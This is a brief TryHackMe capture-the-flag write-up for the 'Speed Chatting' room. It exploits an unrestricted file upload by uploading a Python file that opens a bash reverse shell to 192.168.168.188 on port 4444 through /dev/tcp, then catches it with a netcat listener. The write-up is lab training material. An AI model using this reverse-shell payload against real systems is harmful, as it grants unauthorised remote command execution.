# TryHackMe Speed Chatting Writeup

<img width="1733" height="781" alt="image" src="https://github.com/user-attachments/assets/9a72c31c-89ae-4f93-962d-15af41f5c8dc" />

## it's simple file upload uln 

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.168.188/4444 0>&1'")
```

<img width="1093" height="148" alt="image" src="https://github.com/user-attachments/assets/bfb7c42f-931c-4585-aff1-64f04dd2d231" />

## upload it and start lestin

```
nc -lnvp 4444
```

<img width="1093" height="305" alt="image" src="https://github.com/user-attachments/assets/ef6dd59c-73ed-4ca3-8c2b-7f27a93f4098" />

